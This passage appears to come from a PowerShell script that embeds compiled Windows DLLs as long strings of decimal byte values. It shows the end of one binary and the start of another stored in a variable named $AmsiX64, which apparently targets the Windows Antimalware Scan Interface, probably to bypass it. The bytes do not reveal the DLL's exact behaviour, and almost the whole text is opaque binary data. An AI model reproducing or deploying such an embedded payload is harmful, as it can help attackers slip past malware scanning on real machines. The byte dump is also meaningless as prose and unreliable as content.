0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\"\n$AmsiX64 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 